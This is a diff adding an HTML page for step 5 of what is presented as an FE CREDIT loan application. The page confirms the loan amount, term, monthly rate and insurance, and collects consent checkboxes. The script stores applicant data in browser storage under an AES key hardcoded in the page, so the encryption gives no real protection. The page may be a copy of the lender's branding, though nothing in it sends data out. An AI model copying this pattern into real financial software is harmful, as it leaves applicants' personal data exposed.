@@ -1,0 +1,629 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes, viewport-fit=cover"
+    />
+    <title>Xác nhận đề nghị vay - FE CREDIT</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+
+    <style>
+      :root {
+        --fe-green: #2a83e9;
+        --fe-green-dark: #2e7d32;
+        --fe-bg: #f5f6f8;
+        --fe-text-main: #222222;
+        --fe-text-muted: #6c757d;
+        --fe-border: #e0e3eb;
+        --fe-white: #ffffff;
+        --fe-accent-soft: #eef2ff;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI",
+          Roboto, sans-serif;
+        background-color: var(--fe-bg);
+        color: var(--fe-text-main);
+      }
+
+      .page-wrapper {
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .content {
+        flex: 1;
+        display: flex;
+        justify-content: center;
+        align-items: stretch;
+        padding: 12px 10px 16px 10px;
+      }
+
+      .loan-confirm-card {
+        width: 100%;
+        max-width: 480px;
+        background: var(--fe-white);
+        border-radius: 18px;
+        box-shadow: 0 12px 32px rgba(15, 23, 42, 0.16);
+        padding: 18px 14px 20px 14px;
+      }
+
+      @media (min-width: 576px) {
+        .content {
+          padding: 24px 16px;
+        }
+        .loan-confirm-card {
+          padding: 22px 22px 24px 22px;
+          border-radius: 18px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .content {
+          padding: 10px 8px 16px 8px;
+        }
+        .loan-confirm-card {
+          padding: 18px 14px 20px 14px;
+          border-radius: 16px;
+        }
+      }
+
+      .section-label {
+        font-size: 0.74rem;
+        font-weight: 600;
+        letter-spacing: 0.12em;
+        color: var(--fe-text-muted);
+        text-transform: uppercase;
+        margin-bottom: 8px;
+      }
+
+      .summary-card {
+        border-radius: 14px;
+        border: 1px solid var(--fe-border);
+        background: var(--fe-white);
+        padding: 14px 14px 12px 14px;
+        margin-bottom: 16px;
+      }
+
+      .summary-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 8px;
+      }
+      .summary-label {
+        font-size: 0.78rem;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+        color: var(--fe-text-muted);
+      }
+      .summary-value-main {
+        font-size: 1.7rem;
+        font-weight: 800;
+        color: var(--fe-green);
+        line-height: 1.1;
+      }
+      .summary-value-sub {
+        font-size: 0.95rem;
+        font-weight: 600;
+        color: var(--fe-text-main);
+      }
+
+      @media (max-width: 375px) {
+        .summary-value-main {
+          font-size: 1.5rem;
+        }
+        .summary-value-sub {
+          font-size: 0.9rem;
+        }
+      }
+
+      .details-list {
+        list-style: none;
+        padding: 0;
+        margin: 0 0 14px 0;
+        border-radius: 12px;
+        border: 1px solid #edf1ff;
+        background: #f9fafb;
+      }
+      .details-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 9px 11px;
+        font-size: 0.9rem;
+      }
+      .details-item + .details-item {
+        border-top: 1px solid #edf1ff;
+      }
+      .details-label {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        color: var(--fe-text-main);
+      }
+      .details-value {
+        font-weight: 600;
+        color: var(--fe-text-main);
+      }
+      .details-value-strong {
+        font-weight: 700;
+      }
+      .info-icon {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 16px;
+        height: 16px;
+        border-radius: 50%;
+        font-size: 0.7rem;
+        color: var(--fe-text-muted);
+        border: 1px solid #cbd5f5;
+        background: #eef2ff;
+      }
+
+      .checkbox-group {
+        display: flex;
+        flex-direction: column;
+        gap: 9px;
+        margin: 12px 0 14px 0;
+      }
+
+      .checkbox-row {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        font-size: 0.86rem;
+        line-height: 1.4;
+        color: var(--fe-text-main);
+      }
+
+      .checkbox-square {
+        width: 20px;
+        height: 20px;
+        border-radius: 4px;
+        border: 1.5px solid #cbd1e1;
+        background: #ffffff;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        flex-shrink: 0;
+        transition: all 0.2s ease;
+      }
+      .checkbox-square.checked {
+        border-color: var(--fe-green);
+        background: var(--fe-green);
+      }
+      .checkbox-square > i {
+        font-size: 14px;
+        color: #ffffff;
+        display: none;
+      }
+      .checkbox-square.checked > i {
+        display: block;
+      }
+
+      .checkbox-text a {
+        color: var(--fe-green);
+        text-decoration: none;
+        font-weight: 600;
+      }
+      .checkbox-text a:hover {
+        text-decoration: underline;
+      }
+
+      .ubank-banner {
+        border-radius: 12px;
+        background: linear-gradient(135deg, #eef2ff, #ede7ff);
+        padding: 9px 10px;
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+      }
+      .ubank-content {
+        flex: 1;
+        font-size: 0.85rem;
+        line-height: 1.4;
+      }
+      .ubank-logo-placeholder {
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        background: #ffffff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 0.8rem;
+        font-weight: 700;
+        color: #5b21ff;
+      }
+
+      .contract-link {
+        text-align: center;
+        font-size: 0.88rem;
+        margin: 4px 0 6px 0;
+      }
+      .contract-link a {
+        color: var(--fe-green);
+        text-decoration: none;
+        font-weight: 600;
+      }
+      .contract-link a:hover {
+        text-decoration: underline;
+      }
+
+      .disclaimer {
+        font-size: 0.75rem;
+        color: var(--fe-text-muted);
+        text-align: center;
+        margin-bottom: 12px;
+      }
+
+      .actions {
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+      }
+      .btn-primary-main {
+        border-radius: 999px;
+        background-color: var(--fe-green);
+        border: none;
+        color: #ffffff;
+        font-weight: 700;
+        font-size: 0.95rem;
+        min-height: 46px;
+      }
+      .btn-primary-main:hover {
+        background-color: var(--fe-green-dark);
+      }
+      .btn-secondary-outline {
+        border-radius: 999px;
+        border: 1.5px solid var(--fe-green);
+        background-color: #ffffff;
+        color: var(--fe-green);
+        font-weight: 700;
+        font-size: 0.95rem;
+        min-height: 46px;
+      }
+      .btn-secondary-outline:hover {
+        background-color: #f3fbf5;
+      }
+
+      @media (max-width: 375px) {
+        .actions .btn-primary-main,
+        .actions .btn-secondary-outline {
+          font-size: 0.9rem;
+          min-height: 44px;
+        }
+      }
+
+      .checkbox-error {
+        font-size: 0.78rem;
+        color: #e53e3e;
+        margin-top: 4px;
+        display: none;
+      }
+      .checkbox-error.show {
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="page-wrapper">
+      <div class="content">
+        <div class="loan-confirm-card">
+          <!-- Loan Summary Card -->
+          <div class="section-label">YÊU CẦU</div>
+          <div class="summary-card">
+            <div class="summary-row">
+              <div>
+                <div class="summary-label">TỔNG SỐ TIỀN</div>
+                <div class="summary-value-main" id="summary-amount">
+                  100&nbsp;000&nbsp;000&nbsp;₫
+                </div>
+              </div>
+            </div>
+            <div class="summary-row" style="margin-top:4px;">
+              <div class="summary-label">THỜI HẠN</div>
+              <div class="summary-value-sub" id="summary-duration">
+                36 tháng
+              </div>
+            </div>
+          </div>
+
+          <!-- Loan Details List -->
+          <ul class="details-list">
+            <li class="details-item">
+              <span class="details-label">Lãi suất/tháng</span>
+              <span
+                class="details-value details-value-strong"
+                id="detail-interest"
+                >5.88%</span
+              >
+            </li>
+            <li class="details-item">
+              <span class="details-label">
+                Bảo hiểm tín dụng
+                <span class="info-icon" title="Thông tin về bảo hiểm tín dụng">
+                  i
+                </span>
+              </span>
+              <span class="details-value details-value-strong">CÓ</span>
+            </li>
+          </ul>
+
+          <!-- Consent Forms -->
+          <div class="checkbox-group">
+            <div class="checkbox-row" data-checkbox="consent-1">
+              <div class="checkbox-square" tabindex="0">
+                <i class="bi bi-check-lg"></i>
+              </div>
+              <div class="checkbox-text">
+                Tôi (Chúng tôi) xác nhận rằng việc tham gia bảo hiểm là hoàn
+                toàn tự nguyện và đã đọc, hiểu rõ quyền lợi &amp; nghĩa vụ liên
+                quan đến sản phẩm bảo hiểm này
+                <a href="#" tabindex="0">xem thêm</a>.
+              </div>
+            </div>
+
+            <div class="checkbox-row" data-checkbox="consent-2">
+              <div class="checkbox-square" tabindex="0">
+                <i class="bi bi-check-lg"></i>
+              </div>
+              <div class="checkbox-text">
+                Tôi đồng ý với các điều khoản &amp; điều kiện sử dụng dịch vụ
+                này.
+              </div>
+            </div>
+
+            <div class="ubank-banner" data-checkbox="consent-3">
+              <div class="checkbox-square" tabindex="0">
+                <i class="bi bi-check-lg"></i>
+              </div>
+              <div class="ubank-content">
+                Tôi muốn nhận khoản rút tiền mặt qua tài khoản thanh toán
+                Ubank.
+              </div>
+              <div class="ubank-logo-placeholder" aria-hidden="true">
+                U
+              </div>
+            </div>
+
+            <div id="checkbox-error" class="checkbox-error">
+              Vui lòng xác nhận tất cả các điều khoản bắt buộc trước khi tiếp
+              tục.
+            </div>
+          </div>
+
+          <!-- Footer & Actions -->
+          <div class="contract-link">
+            <a href="step6.html">Xem và xác nhận hợp đồng &gt;</a>
+          </div>
+          <div class="disclaimer">
+            * Tôi đọc và đồng ý với nội dung của Giấy đăng ký bảo hiểm hợp đồng cho vay, các điều kiện Giao dịch chung liên quan.
+          </div>
+
+          <div class="actions">
+            <button
+              id="btn-sign"
+              type="button"
+              class="btn btn-primary-main"
+            >
+              KÝ HỢP ĐỒNG
+            </button>
+            <button
+              id="btn-decline"
+              type="button"
+              class="btn btn-secondary-outline"
+            >
+              TỪ CHỐI
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script>
+      // =====================================================================
+      // PHẦN 1: LOGIC LƯU VỊ TRÍ - Save current step on page load
+      // =====================================================================
+      // Lưu vị trí hiện tại ngay khi trang tải
+      localStorage.setItem('currentStep', 'step5.html');
+
+      function toNumberOrZero(value) {
+        if (value === null || value === undefined) return 0;
+        if (typeof value === "number") return value;
+        const cleaned = String(value).replace(/,/g, "").trim();
+        const n = parseFloat(cleaned);
+        return isNaN(n) ? 0 : n;
+      }
+
+      function formatCurrency(n) {
+        if (!n || isNaN(n)) return "0 ₫";
+        return (
+          Number(n).toLocaleString("vi-VN").replace(/,/g, " ") + " ₫"
+        );
+      }
+
+      function loadUserDataStep5() {
+        try {
+          const stored = localStorage.getItem("userData");
+          if (!stored) return null;
+          const decrypted = CryptoJS.AES.decrypt(
+            stored,
+            "fecredit-secret-key-v1"
+          ).toString(CryptoJS.enc.Utf8);
+          if (!decrypted) return null;
+          return JSON.parse(decrypted);
+        } catch (e) {
+          console.error("Lỗi đọc userData tại step5:", e);
+          return null;
+        }
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const data = loadUserDataStep5();
+        const amountEl = document.getElementById("summary-amount");
+        const durationEl = document.getElementById("summary-duration");
+        const interestEl = document.getElementById("detail-interest");
+
+        if (data) {
+          let loanAmount = 0;
+
+          if (data.loanAmount === "other" && data.customLoanAmount) {
+            loanAmount = toNumberOrZero(data.customLoanAmount);
+          } else if (data.loanAmount !== undefined && data.loanAmount !== null) {
+            loanAmount = toNumberOrZero(data.loanAmount);
+          }
+
+          if (amountEl) {
+            amountEl.textContent = formatCurrency(loanAmount);
+          }
+
+          let loanTerm = 0;
+          if (data.loanTerm !== undefined && data.loanTerm !== null) {
+            loanTerm = parseInt(String(data.loanTerm).trim(), 10);
+            loanTerm = isNaN(loanTerm) ? 0 : loanTerm;
+          }
+          if (durationEl) {
+            durationEl.textContent =
+              loanTerm > 0 ? loanTerm + " tháng" : "--";
+          }
+
+          if (interestEl && data.interestRate !== undefined && data.interestRate !== null) {
+            const rateYear = toNumberOrZero(data.interestRate);
+            if (rateYear > 0) {
+              const perMonth = rateYear / 12;
+              interestEl.textContent = perMonth.toFixed(2) + "%";
+            }
+          }
+
+          data.currentStep = 5;
+          localStorage.setItem(
+            "userData",
+            CryptoJS.AES.encrypt(
+              JSON.stringify(data),
+              "fecredit-secret-key-v1"
+            ).toString()
+          );
+        }
+
+        // Checkbox logic – CHỈ gắn event vào ô vuông
+        const checkboxSquares = document.querySelectorAll(
+          "[data-checkbox] .checkbox-square"
+        );
+        const checkboxError = document.getElementById("checkbox-error");
+
+        checkboxSquares.forEach((square) => {
+          square.addEventListener("click", (e) => {
+            e.preventDefault();
+            square.classList.toggle("checked");
+          });
+
+          square.addEventListener("keydown", (e) => {
+            if (e.key === " " || e.key === "Enter") {
+              e.preventDefault();
+              square.classList.toggle("checked");
+            }
+          });
+        });
+
+        function allRequiredConsentsChecked() {
+          const consent1 = document.querySelector(
+            '[data-checkbox="consent-1"] .checkbox-square'
+          );
+          const consent2 = document.querySelector(
+            '[data-checkbox="consent-2"] .checkbox-square'
+          );
+          return (
+            consent1 && consent1.classList.contains("checked") &&
+            consent2 && consent2.classList.contains("checked")
+          );
+        }
+
+        const btnSign = document.getElementById("btn-sign");
+        const btnDecline = document.getElementById("btn-decline");
+
+        if (btnSign) {
+          btnSign.addEventListener("click", function () {
+            if (!allRequiredConsentsChecked()) {
+              checkboxError && checkboxError.classList.add("show");
+              return;
+            }
+            checkboxError && checkboxError.classList.remove("show");
+
+            try {
+              const stored = localStorage.getItem("userData");
+              if (stored) {
+                const decrypted = CryptoJS.AES.decrypt(
+                  stored,
+                  "fecredit-secret-key-v1"
+                ).toString(CryptoJS.enc.Utf8);
+                if (decrypted) {
+                  const obj = JSON.parse(decrypted);
+                  obj.consentedInsurance = document
+                    .querySelector('[data-checkbox="consent-1"] .checkbox-square')
+                    .classList.contains("checked");
+                  obj.consentedTerms = document
+                    .querySelector('[data-checkbox="consent-2"] .checkbox-square')
+                    .classList.contains("checked");
+                  obj.wantUbank = document
+                    .querySelector('[data-checkbox="consent-3"] .checkbox-square')
+                    .classList.contains("checked");
+                  obj.currentStep = 6;
+                  localStorage.setItem(
+                    "userData",
+                    CryptoJS.AES.encrypt(
+                      JSON.stringify(obj),
+                      "fecredit-secret-key-v1"
+                    ).toString()
+                  );
+                }
+              }
+            } catch (e) {
+              console.error("Lỗi cập nhật consents:", e);
+            }
+
+            // Đồng ý giải ngân -> sang step7
+            window.location.href = "step7.html";
+          });
+        }
+
+        if (btnDecline) {
+          btnDecline.addEventListener("click", function () {
+            window.location.href = "../index.html";
+          });
+        }
+      });
+    </script>
+  </body>
+</html>
+
+
